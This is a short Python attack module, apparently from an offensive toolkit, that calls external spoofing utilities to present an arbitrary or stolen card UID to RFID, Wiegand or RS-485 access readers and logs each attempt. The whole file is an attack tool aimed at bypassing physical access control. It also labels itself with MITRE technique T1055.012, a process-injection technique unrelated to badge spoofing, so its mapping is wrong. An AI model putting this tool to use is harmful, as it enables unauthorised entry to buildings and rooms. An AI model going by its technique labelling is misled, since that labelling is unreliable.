#!/usr/bin/env python3
# modules/attacks/access_card_reader_spoofer.py

import argparse
import json
import os
import time
from datetime import datetime
import subprocess

LOG_FILE = "results/card_reader_spoof_log.json"
MITRE_TTP = "T1055.012"

def log_spoof(uid, mode):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "spoofed_uid": uid,
            "mode": mode,
            "ttp": MITRE_TTP
        }) + "\n")

def spoof_rfid(uid, mode):
    try:
        if mode == "rfid":
            subprocess.run(["rfidspoof", "--uid", uid])
        elif mode == "wiegand":
            subprocess.run(["wiegand-spoof", "--id", uid])
        elif mode == "rs485":
            subprocess.run(["rs485-spoof", "--addr", uid])
        else:
            raise ValueError("Unsupported mode")
        log_spoof(uid, mode)
        print(f"[✓] Spoofed access UID {uid} via {mode}")
    except Exception as e:
        print(f"[!] Spoof failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof access card readers with arbitrary UIDs")
    parser.add_argument("--uid", required=True, help="UID to spoof (admin card or stolen)")
    parser.add_argument("--mode", choices=["rfid", "wiegand", "rs485"], required=True, help="Protocol to spoof")
    args = parser.parse_args()

    spoof_rfid(args.uid, args.mode)
